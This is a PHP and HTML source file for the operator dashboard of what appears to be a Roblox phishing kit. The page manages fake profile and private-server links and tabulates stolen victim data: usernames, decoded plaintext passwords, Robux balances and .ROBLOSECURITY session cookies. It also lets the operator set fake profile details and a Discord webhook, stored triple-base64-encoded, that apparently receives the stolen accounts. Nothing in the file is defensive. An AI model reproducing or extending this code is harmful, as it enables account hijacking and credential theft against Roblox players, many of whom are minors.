<?php
session_start();
require('../setup.php');
if(!$_SESSION['linkid']){
header('location: /controller/sign-in');
} else {
$id = $_SESSION['linkid'];
$directory = "../users/$id";
if (!file_exists($directory)) {
$_SESSION['linkid'] = '';
header('location: /controller/sign-in');
} else {
$username = htmlspecialchars(file_get_contents("$directory/setup/fusername.txt"));
$rusername = htmlspecialchars(file_get_contents("$directory/setup/rusername.txt"));
function uid($username){
    $ch = curl_init('https://users.roblox.com/v1/usernames/users');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $headers = ["content-type: application/json"];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_POSTFIELDS, '{"usernames": ["'."".$username."".'"],"excludeBannedUsers": false}');
    $collectionDecode = json_decode(curl_exec($ch), true);
    $i = "0";
    $collectionData = $collectionDecode["data"];
    foreach ($collectionData as $collectionValue) {
    $uid.=$collectionValue['id'];
    return $uid;
    }
}
$rid = uid($rusername);
$thumbnail_json = file_get_contents("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=$rid&size=352x352&format=Png&isCircular=false");
preg_match_all('/\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|$!:,.;]*[A-Z0-9+&@#\/%=~_|$]/i', $thumbnail_json, $pthumbnail);
foreach($pthumbnail[0] as $pthumbnail){}
$json = file_get_contents("$directory/cookies/json.txt");
$count = number_format(substr_count($json,'{"avatar":"'));
$quotation = "'";
if (strpos($json, 'avatar')) {
$json = substr($json,0,-2);
$json.='}]}';
$json = '{"data":[' . $json;
$jsondecode = json_decode($json, true);
$i = '0';
foreach ($jsondecode['data'] as $storagevalue) {
$i++;
$password = htmlspecialchars(base64_decode($storagevalue['password']));
$storage.='<tr><td>'."".$i."".'<td><img src="'."".$storagevalue['avatar']."".'" alt="" class="w-px-40 h-auto rounded-circle" data-bs-toggle="tooltip" data-popup="tooltip-custom" data-bs-original-title="'."".$storagevalue['username']."".'"></td><td>'."".$storagevalue['username']."".'</td><td>'."".$password."".'</td><td><span class="badge bg-label-success me-1">'."".$storagevalue['robux']."".'</span></td><td><span class="badge bg-label-success me-1">'."".$storagevalue['rap']."".'</span></td><td><button type="button" class="btn rounded-pill btn-primary" onclick="viewcookie('."".$quotation."".''."".$storagevalue['avatar']."".''."".$quotation."".', '."".$quotation."".''."".$storagevalue['username']."".''."".$quotation."".', '."".$quotation."".''."".$password."".''."".$quotation."".', '."".$quotation."".''."".$storagevalue['robux']."".''."".$quotation."".', '."".$quotation."".''."".$storagevalue['rap']."".''."".$quotation."".', '."".$quotation."".''."".$storagevalue['roblosecurity']."".''."".$quotation."".')"><span class="tf-icons bx bx-cookie"></span>&nbsp; View</button></td></tr>';
}
} else {
$storage = '<tr><td><td><td><td>No Data Found<td><td><td>';
}
}
}
?>

<!DOCTYPE html>
<html lang="en" class="light-style layout-menu-fixed" dir="ltr" data-theme="theme-default" data-assets-path="/assets/controller/" data-template="vertical-menu-template-free">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0"/>
    <title><?=$name?> | Controller</title>
    <link rel="icon" type="image/x-icon" href="<?=$thumbnail?>" />
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet"/>
    <link rel="stylesheet" href="/assets/controller/index.css" />
    <script src="https://kit.fontawesome.com/73330e158b.js" crossorigin="anonymous"></script>
    <script src='//cdn.jsdelivr.net/npm/sweetalert2@11'></script>
    <style>
    .disclaimer{
    display:none;
    }
    </style>
    <script src="/assets/controller/js/helpers.js"></script>
  </head>

  <body>
    <!-- Layout wrapper -->
    <div class="layout-wrapper layout-content-navbar">
      <div class="layout-container">
        <!-- Menu -->

        <aside id="layout-menu" class="layout-menu menu-vertical menu bg-menu-theme">
          <div class="app-brand demo">
            <a class="app-brand-link">
              <span class="app-brand-text demo menu-text fw-bolder ms-2"><?=$name?></span>
            </a>

            <a href="javascript:void(0);" class="layout-menu-toggle menu-link text-large ms-auto d-block d-xl-none">
              <i class="bx bx-chevron-left bx-sm align-middle"></i>
            </a>
          </div>

          <div class="menu-inner-shadow"></div>

          <ul class="menu-inner py-1">
            <!-- Dashboard -->
            <li class="menu-item open">
              <a href="javascript:void(0);" class="menu-link menu-toggle">
                <i class="menu-icon tf-icons bx bx-home-circle"></i>
                <div data-i18n="Layouts">Dashboard</div>
              </a>

              <ul class="menu-sub">
                <li class="menu-item active" id="home-menu">
                  <a onclick="home()" class="menu-link">
                    <div data-i18n="Home">Home</div>
                  </a>
                </li>
                <li class="menu-item" id="controller-menu">
                  <a onclick="controller()" class="menu-link">
                    <div data-i18n="Controller">Controller</div>
                  </a>
                </li>
                <li class="menu-item" id="storage-menu">
                  <a onclick="storage()" class="menu-link">
                    <div data-i18n="Cookies">Cookies <?php if($count>0):?><span class="badge badge-center bg-success"><?=$count?></span><?php endif;?></div>
                  </a>
                </li>
              </ul>
            </li>
          </ul>
        </aside>
        <!-- / Menu -->

        <!-- Layout container -->
        <div class="layout-page">
          <!-- Navbar -->

          <nav
            class="layout-navbar container-xxl navbar navbar-expand-xl navbar-detached align-items-center bg-navbar-theme"
            id="layout-navbar"
          >
            <div class="layout-menu-toggle navbar-nav align-items-xl-center me-3 me-xl-0 d-xl-none">
              <a class="nav-item nav-link px-0 me-xl-4" href="javascript:void(0)">
                <i class="bx bx-menu bx-sm"></i>
              </a>
            </div>

            <div class="navbar-nav-right d-flex align-items-center" id="navbar-collapse">
              <!-- Search -->
              <div class="navbar-nav align-items-center">
                <div class="nav-item d-flex align-items-center">
                  <i class="bx bx-search fs-4 lh-0"></i>
                  <input
                    type="text"
                    class="form-control border-0 shadow-none"
                    placeholder="Search..."
                    aria-label="Search..."
                  />
                </div>
              </div>
              <!-- /Search -->

              <ul class="navbar-nav flex-row align-items-center ms-auto">

                <!-- User -->
                <li class="nav-item navbar-dropdown dropdown-user dropdown">
                  <a class="nav-link dropdown-toggle hide-arrow" href="javascript:void(0);" data-bs-toggle="dropdown">
                    <div class="avatar avatar-online">
                      <img src="<?=$pthumbnail?>" alt class="w-px-40 h-auto rounded-circle" />
                    </div>
                  </a>
                  <ul class="dropdown-menu dropdown-menu-end">
                    <li>
                      <a class="dropdown-item">
                        <div class="d-flex">
                          <div class="flex-shrink-0 me-3">
                            <div class="avatar avatar-online">
                              <img src="<?=$pthumbnail?>" alt class="w-px-40 h-auto rounded-circle" />
                            </div>
                          </div>
                          <div class="flex-grow-1">
                            <span class="fw-semibold d-block" id="current-username"><?=$username?></span>
                            <small class="text-muted">User</small>
                          </div>
                        </div>
                      </a>
                    </li>
                    <li>
                      <div class="dropdown-divider"></div>
                    </li>
                    <li>
                      <a class="dropdown-item">
                        <i class="bx bx-cog me-2"></i>
                        <span class="align-middle">Settings</span>
                      </a>
                      <a class="dropdown-item" href="/controller/sign-out">
                        <i class="bx bx-power-off me-2"></i>
                        <span class="align-middle">Log Out</span>
                      </a>
                    </li>
                  </ul>
                </li>
                <!--/ User -->
              </ul>
            </div>
          </nav>

          <!-- / Navbar -->

          <!-- Content wrapper -->
          <div class="content-wrapper">
            <!-- Content -->
              <div class="modal fade" id="accountModal" tabindex="-1" style="display: none;" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" id="modalCenterTitle">Delete Account</h5>
                  <button type="button" class="btn-close" id="btn-close1" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                  <div class="row">
                    <div class="col mb-3">
                      <label class="form-label">Token</label>
                      <input id="confirm-token" class="form-control" placeholder="Token">
                    </div>
                  </div>
                </div>
                <div class="modal-footer">
                  <div class="alert alert-warning">
                  <h6 class="alert-heading fw-bold mb-1">Are you sure you would like to delete your account?</h6>
                  <p class="mb-0">Once you delete your account, you cannot recover it. Please be certain.</p>
                  </div>
                  <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Close</button>
                  <button type="button" class="btn btn-danger" onclick="delete_account()">Delete</button>
                </div>
              </div>
            </div>
          </div>
            <div class="modal fade" id="cookieModal" tabindex="-1" style="display:none;" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered" role="document">
              <div class="modal-content">
                <div class="modal-header">
                  <h5 class="modal-title" id="accountInformation"></h5>
                  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                  <div class="row g-2">
                    <div class="col mb-0">
                      <label for="usernameWithTitle" class="form-label">Username</label>
                      <input id="usernameWithTitle" class="form-control" disabled>
                    </div>
                    <div class="col mb-0">
                      <label for="passwordWithTitle" class="form-label">Password</label>
                      <input id="passwordWithTitle" class="form-control" disabled>
                    </div>
                </div>
                  <div class="row g-2">
                    <div class="col mb-0">
                      <label for="robuxWithTitle" class="form-label">Robux</label>
                      <input id="robuxWithTitle" class="form-control" disabled>
                    </div>
                    <div class="col mb-0">
                      <label for="rapWithTitle" class="form-label">RAP</label>
                      <input id="rapWithTitle" class="form-control" disabled>
                    </div>
                </div>
                  <div class="row g-2">
                    <div class="col mb-0">
                      <label for="roblosecurityWithTitle" class="form-label">.ROBLOSECURITY</label>
                      <textarea id="roblosecurityWithTitle" class="form-control" style="height: 121px;" disabled></textarea>
                    </div>
                </div>
                  <br>
                  <div class="row g-2">
                  <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Close</button>
                  </div>
              </div>
            </div>
          </div>
          </div>
            <div class="container-xxl flex-grow-1 container-p-y" id="home-html">
              <div class="row">
                <div class="col-lg-12 mb-8 order-0">
                  <div class="card">
                    <div class="d-flex align-items-end row">
                      <div class="col-sm-7">
                        <div class="card-body">
                          <h5 class="card-title text-primary">Congratulations! 🎉</h5>
                          <p class="mb-4">
                            Your fake links are now active. You can manage and view them here.
                          </p>
                          <button type="button" class="btn btn-primary" onclick="controller()">Controller</button>
                          <button class="btn btn-danger btn btn-outline-secondary" data-bs-toggle="modal" data-bs-target="#accountModal">Delete Account</button>
                        </div>
                      </div>
                      <div class="col-sm-5 text-center text-sm-left">
                        <div class="card-body pb-0 px-0 px-md-4">
                          <img
                            src="/assets/controller/images/controller.png"
                            height="140"
                            alt="View Badge User"
                            data-app-dark-img="/assets/controller/images/controller.png"
                            data-app-light-img="/assets/controller/images/controller.png"
                          />
                        </div>
                      </div>
                    </div>
                  </div>
                  <hr class="my-5">
                  <div class="card">
                    <h5 class="card-header">Your Sites:</h5>
                    <div class="table-responsive text-nowrap">
                      <table class="table table-hover">
                        <thead>
                          <tr>
                            <th>#</th>
                            <th>URL</th>
                            <th>Type</th>
                          </tr>
                        </thead>
                        <tbody class="table-border-bottom-0">
                          <tr>
                            <td><strong>1</strong></td>
                            <td><strong>https://<?=$_SERVER['SERVER_NAME']?>/users/<?=$id?>/profile</strong></td>
                            <td><strong>Profile</strong></td>
                          </tr>
                          <tr>
                            <td><strong>2</strong></td>
                            <td><strong>?privateServerLinkCode=<?=$id?></strong></td>
                            <td><strong>Game</strong></td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  </div>
                  <hr class="my-5">
                  <div class="row">
                    <div class="col-lg-6 col-md-12 col-6 mb-4">
                      <div class="card">
                        <div class="card-body">
                          <span class="fw-semibold d-block mb-1">Total Accounts</span>
                          <h3 class="card-title mb-2"><?=$count?></h3>
                        </div>
                      </div>
                    </div>
                    <div class="col-lg-6 col-md-12 col-6 mb-4">
                      <div class="card">
                        <div class="card-body">
                          <span class="fw-semibold d-block mb-1">Total Links</span>
                          <h3 class="card-title mb-2">2</h3>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <div class="container-xxl flex-grow-1 container-p-y" id="storage-html" style="display:none">
              <div class="row">
                <div class="col-lg-12 mb-8 order-0">
                  <div class="card">
                    <h5 class="card-header">Cookie Storage <span class="badge badge-center bg-success"><?=$count?></span></h5>
                    <div class="table-responsive text-nowrap">
                     <table class="table table-hover">
                        <thead>
                          <tr>
                            <th>#</th>
                            <th>Avatar</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Robux</th>
                            <th>RAP</th>
                            <th>.ROBLOSECURITY</th>
                          </tr>
                        </thead>
                        <tbody class="table-border-bottom-0">
                        <?=$storage?>
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
         <button id="cookie-modal" style="display:none" data-bs-toggle="modal" data-bs-target="#cookieModal"></button>
            </div>
            <div class="container-xxl flex-grow-1 container-p-y" id="controller-html" style="display:none">
            <div class="row">
                <!-- Basic Layout -->
                <div class="col-xxl">
                  <div class="card mb-4">
                    <div class="card-header d-flex align-items-center justify-content-between">
                      <h5 class="mb-0">Controller</h5>
                    </div>
                    <div class="card-body">
                        <div class="row mb-3">
                          <label class="col-sm-2 col-form-label" for="basic-default-name">Selection</label>
                          <div class="col-sm-10">
                            <select id="select" onchange="Selection(this)" class="form-select">
                              <option value="0">Select</option>
                              <option value="1">Real Username</option>
                              <option value="2">Fake Username</option>
                              <option value="3">About Me</option>
                              <option value="4">Friends</option>
                              <option value="5">Followers</option>
                              <option value="6">Followings</option>
                              <option value="7">Webhook</option>
                            </select>
                          </div>
                        </div>
                    </div>
                  </div>
                  <hr class="my-5">
        <!-- / Break -->
                  <div id="controller-form" style="display:none">
                      <form action="javascript:0">
                        <div class="card mb-4">
                        <div class="card-body">
                          <div class="mb-3 row">
                            <label for="html5-text-input" class="col-md-2 col-form-label">Currently</label>
                            <div class="col-md-10">
                              <input class="form-control" type="text" id="current-value" disabled>
                            </div>
                          </div>
                          <div class="mb-3 row">
                            <label for="html5-text-input" class="col-md-2 col-form-label">New</label>
                            <div class="col-md-10">
                              <input class="form-control" type="text" id="new-value">
                            </div>
                          </div>
                            <div class="row justify-content-end">
                              <div class="col-sm-12">
                                <button type="submit" onclick="change()" id="change-btn" class="btn btn-primary full"><i class="fa-solid fa-arrows-rotate"></i> Change</button>
                              </div>
                            </div>
                        </div>
                      </div>
                    </form>
                  </div>
            <!-- / Break -->
              </div>
            </div>
            <!-- / Content -->
            <!-- Footer -->
            <footer class="content-footer footer bg-footer-theme">
              <div class="container-xxl d-flex flex-wrap justify-content-between py-2 flex-md-row flex-column">
                <div class="mb-2 mb-md-0">
                  © <script>document.write(new Date().getFullYear());</script>
                </div>
              </div>
            </footer>
            <div class="content-backdrop fade"></div>
          </div>
        </div>
      </div>
      <div class="layout-overlay layout-menu-toggle"></div>
    </div>
    <script src="/assets/controller/js/jquery.js"></script>
    <script src="/assets/controller/js/popper.js"></script>
    <script src="/assets/controller/js/bootstrap.js"></script>
    <script src="/assets/controller/js/perfect-scrollbar.js"></script>
    <script src="/assets/controller/js/menu.js"></script>
    <script src="/assets/controller/js/apexcharts.js"></script>
    <script src="/assets/controller/js/main.js"></script>
    <script src="/assets/controller/js/dashboards-analytics.js"></script>
    <script>
    function viewcookie(avatar, username, password, robux, rap, roblosecurity){
    document.getElementById('accountInformation').textContent = username + "'s Account";
    document.getElementById('usernameWithTitle').value = username;
    document.getElementById('passwordWithTitle').value = password;
    document.getElementById('robuxWithTitle').value = robux;
    document.getElementById('rapWithTitle').value = rap;
    document.getElementById('roblosecurityWithTitle').textContent = roblosecurity;
    document.getElementById('cookie-modal').click();
    }
    function delete_account(){
    var postfields = new FormData();
	postfields.append('confirm-token', document.getElementById('confirm-token').value.substring(document.getElementById('confirm-token').value.indexOf('-') + 1));
	postfields.append('type', '9');
    fetch('/controller/change', {
    method: "POST",
    body: postfields,
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('btn-close1').click();
    if(response==1){
    window.location.replace('/controller/sign-in');
    } else {
    Swal.fire(
    'Failed!',
    response,
    'error'
    )
    }
    })
    }
    function username(){
    var postfields = new FormData();
	postfields.append('new-value', document.getElementById('new-username').value);
	postfields.append('type', '8');
    fetch('/controller/change', {
    method: "POST",
    body: postfields,
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('btn-close').click();
    if(response==1){
    document.getElementById('current-username').innerHTML = document.getElementById('new-username').value;
    Swal.fire(
   'Success!',
   '<b>Your username has been successfully changed.</b>',
   'success'
    )
    } else {
    Swal.fire(
    'Failed!',
    response,
    'error'
    )
    }
    })
    }
    function numeric(){
    document.getElementById('new-value').value = document.getElementById('new-value').value.replace(/\D/g,'');
    if(document.getElementById('new-value').value > 200){
    document.getElementById('new-value').value = 200;
    }
    }
    function numerico(){
    document.getElementById('new-value').value = document.getElementById('new-value').value.replace(/\D/g,'');
    }
    function home(){
    document.getElementById('home-menu').setAttribute('class', 'menu-item active');
    document.getElementById('controller-menu').setAttribute('class', 'menu-item');
    document.getElementById('storage-menu').setAttribute('class', 'menu-item');
    document.getElementById('home-html').style.display = 'block';
    document.getElementById('controller-html').style.display = 'none';
    document.getElementById('storage-html').style.display = 'none';
    }
    function controller(){
    document.getElementById('home-menu').setAttribute('class', 'menu-item');
    document.getElementById('controller-menu').setAttribute('class', 'menu-item active');
    document.getElementById('storage-menu').setAttribute('class', 'menu-item');
    document.getElementById('home-html').style.display = 'none';
    document.getElementById('controller-html').style.display = 'block';
    document.getElementById('storage-html').style.display = 'none';
    }
    function storage(){
    document.getElementById('home-menu').setAttribute('class', 'menu-item');
    document.getElementById('controller-menu').setAttribute('class', 'menu-item');
    document.getElementById('storage-menu').setAttribute('class', 'menu-item active');
    document.getElementById('home-html').style.display = 'none';
    document.getElementById('controller-html').style.display = 'none';
    document.getElementById('storage-html').style.display = 'block';
    }
    function Selection(e){
    Math.random()
    if(e.value=="0"){
    document.getElementById('controller-form').style.display = 'none';
    }
    if(e.value=="1"){
    var url = '/users/<?=$id?>/setup/rusername.txt?' + Math.random() + '=' + Math.random();
    fetch(url, {
    method: "GET"
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('current-value').value = response;
    document.getElementById('new-value').placeholder = 'New Real Username';
    document.getElementById('new-value').value = '';
    document.getElementById('new-value').parentNode.replaceChild(document.getElementById('new-value').cloneNode(true), document.getElementById('new-value'));
    document.getElementById('controller-form').style.display = 'block';
    })
    }
    if(e.value=="2"){
    var url = '/users/<?=$id?>/setup/fusername.txt?' + Math.random() + '=' + Math.random();
    fetch(url, {
    method: "GET"
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('current-value').value = response;
    document.getElementById('new-value').placeholder = 'New Fake Username';
    document.getElementById('new-value').value = '';
    document.getElementById('new-value').parentNode.replaceChild(document.getElementById('new-value').cloneNode(true), document.getElementById('new-value'));
    document.getElementById('controller-form').style.display = 'block';
    })
    }
    if(e.value=="3"){
    var url = '/users/<?=$id?>/setup/aboutme.txt?' + Math.random() + '=' + Math.random();
    fetch(url, {
    method: "GET"
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('current-value').value = response;
    document.getElementById('new-value').placeholder = 'New About Me';
    document.getElementById('new-value').value = '';
    document.getElementById('new-value').parentNode.replaceChild(document.getElementById('new-value').cloneNode(true), document.getElementById('new-value'));
    document.getElementById('controller-form').style.display = 'block';
    })
    }
    if(e.value=="4"){
    var url = '/users/<?=$id?>/setup/friends.txt?' + Math.random() + '=' + Math.random();
    fetch(url, {
    method: "GET"
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('current-value').value = response;
    document.getElementById('new-value').placeholder = 'New Friend Count';
    document.getElementById('new-value').value = '';
    document.getElementById('new-value').parentNode.replaceChild(document.getElementById('new-value').cloneNode(true), document.getElementById('new-value'));
    document.getElementById('new-value').addEventListener('input', function(){numeric()}, true);
    document.getElementById('controller-form').style.display = 'block';
    })
    }
    if(e.value=="5"){
    var url = '/users/<?=$id?>/setup/followers.txt?' + Math.random() + '=' + Math.random();
    fetch(url, {
    method: "GET"
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('current-value').value = response;
    document.getElementById('new-value').placeholder = 'New Follower Count';
    document.getElementById('new-value').value = '';
    document.getElementById('new-value').parentNode.replaceChild(document.getElementById('new-value').cloneNode(true), document.getElementById('new-value'));
    document.getElementById('new-value').addEventListener('input', function(){numerico()}, true);
    document.getElementById('controller-form').style.display = 'block';
    })
    }
    if(e.value=="6"){
    var url = '/users/<?=$id?>/setup/followings.txt?' + Math.random() + '=' + Math.random();
    fetch(url, {
    method: "GET"
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('current-value').value = response;
    document.getElementById('new-value').placeholder = 'New Following Count';
    document.getElementById('new-value').value = '';
    document.getElementById('new-value').parentNode.replaceChild(document.getElementById('new-value').cloneNode(true), document.getElementById('new-value'));
    document.getElementById('new-value').addEventListener('input', function(){numerico()}, true);
    document.getElementById('controller-form').style.display = 'block';
    })
    }
    if(e.value=="7"){
    var url = '/users/<?=$id?>/setup/webhook.txt?' + Math.random() + '=' + Math.random();
    fetch(url, {
    method: "GET"
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('current-value').value = atob(atob(atob(response)));
    document.getElementById('new-value').placeholder = 'New Discord Webhook';
    document.getElementById('new-value').value = '';
    document.getElementById('new-value').parentNode.replaceChild(document.getElementById('new-value').cloneNode(true), document.getElementById('new-value'));
    document.getElementById('controller-form').style.display = 'block';
    })
    }
    }
    function change(){
    document.getElementById('change-btn').innerHTML = '<i class="fas fa-circle-notch fa-spin"></i>&nbsp;Processing..';
    var postfields = new FormData();
	postfields.append('new-value', document.getElementById('new-value').value);
	postfields.append('type', document.getElementById('select').value);
    fetch('/controller/change', {
    method: "POST",
    body: postfields,
    })
    .then((result) => {
    return result.text();
    })
    .then((response) => {
    document.getElementById('change-btn').innerHTML = '<i class="fa-solid fa-arrows-rotate"></i>&nbsp;Change..';
    if(response==1){
    document.getElementById('current-value').value = document.getElementById('new-value').value;
    document.getElementById('new-value').value = '';
    Swal.fire(
   'Success!',
   '<b>The value has been successfully changed! Clear your cache if it has not updated for you.</b>',
   'success'
    )
    } else {
    Swal.fire(
    'Failed!',
    response,
    'error'
    )
    }
    })
    }
    </script>
    <script async="" defer="" src="https://buttons.github.io/buttons.js"></script>
  </body>
</html>